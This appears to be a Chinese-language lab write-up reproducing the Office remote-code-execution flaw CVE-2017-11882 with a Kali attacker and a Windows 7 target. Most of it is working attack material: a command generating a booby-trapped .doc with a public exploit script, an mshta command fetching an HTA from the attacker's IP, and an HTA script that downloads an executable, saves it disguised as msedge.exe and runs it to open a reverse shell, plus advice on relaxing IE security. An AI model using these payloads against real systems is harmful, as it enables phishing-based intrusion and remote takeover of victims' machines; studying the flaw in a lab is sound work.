---
date: 2025-10-09
category:
  - 网络安全
  - 网络钓鱼
tags:
  - 钓鱼附件
  - Office
  - Office漏洞
  - CVE-2017-11882
excerpt: Microsoft Office 2007 Service Pack 3、Microsoft Office 2010 Service Pack 2、Microsoft Office 2013 Service Pack 1 和 Microsoft Office 2016 存在内存对象处理漏洞，允许攻击者以当前用户身份运行任意代码，该漏洞又称为“Microsoft Office 内存损坏漏洞”。此 CVE ID 与 CVE-2017-11884 不同。
---

# CVE-2017-11882

> [CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com)](https://www.sqlsec.com/2020/10/office.html)
> 
---

- [CVE-2017-11882](#cve-2017-11882)
  - [简介](#简介)
  - [复现环境](#复现环境)
  - [漏洞复现](#漏洞复现)
  - [参考材料](#参考材料)

---

## 简介

潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）影响版本从 Office 2000 到当时最新的 Office 2016，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。

---

## 复现环境

- 靶机: 
  - [Win7SP1旗舰版](https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0)+[Office2016](https://msdn.itellyou.cn/)
  - IP: `192.168.1.14`

- 攻击机 Kali
  - IP: `100.1.1.131`

---

## 漏洞复现

利用 [GitHub - Ridter/CVE-2017-11882: CVE-2017-11882 from https://github.com/embedi/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882) 中的 [Command109b_CVE-2017-11882.py](https://github.com/Ridter/CVE-2017-11882/blob/master/Command109b_CVE-2017-11882.py) 生成带命令的 doc 文件

```bash
python2 Command109b_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o calc.doc
```

![image-20240617055440013](http://cdn.ayusummer233.top/DailyNotes/202406170554036.png)

受害者打开此文档即会弹出计算器

![image-20240617055823640](http://cdn.ayusummer233.top/DailyNotes/202406170558724.png)

---

试了下一些下载与执行文件的命令，效果都不是很理想，试下来似乎只适合短链命令，例如结合mshta脚本使用

`calc.hta`

```htaccess
<script>
    new ActiveXObject("WScript.Shell").Run("calc.exe");
</script>
```

```bash
python2 Command109b_CVE-2017-11882.py -c "mshta http://100.1.1.131:8000/download/calc.hta" -o htacalc.doc
```

![image-20240617064749124](http://cdn.ayusummer233.top/DailyNotes/202406170647275.png)

---

`deexe.hta`

```htaccess
<script>
var url = 'http://100.1.1.131:8000/download/normal.exe';var network = new ActiveXObject('WScript.Network');var username = network.UserName;var downloadPath = 'C:\\Users\\' + username + '\\AppData\\Local\\Temp\\msedge.exe';var xmlhttp = new ActiveXObject('MSXML2.XMLHTTP');xmlhttp.open('GET', url, false);xmlhttp.send();var stream = new ActiveXObject('ADODB.Stream');stream.Open();stream.Type = 1;stream.Write(xmlhttp.responseBody);stream.Position = 0;stream.SaveToFile(downloadPath, 2); stream.Close();var shell = new ActiveXObject('WScript.Shell');shell.Run(downloadPath);
</script>
```

![image-20240617065522463](http://cdn.ayusummer233.top/DailyNotes/202406170655737.png)

如果遇到上述错误需要 `ie-->Internet选项-->安全-->自定义级别-->找到“通过域访问数据源”-->选择“启用”。`

![image-20240617065739113](http://cdn.ayusummer233.top/DailyNotes/202406170657155.png)

也可以直接把站点加到可信站点里来帮助复现

成功反弹shell：

![image-20240617070200444](http://cdn.ayusummer233.top/DailyNotes/202406170702490.png)

---


## 参考材料

- 分析

- 利用工具
  - [GitHub - Ridter/CVE-2017-11882: CVE-2017-11882 from https://github.com/embedi/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)

- 复现过程

- 检测对抗

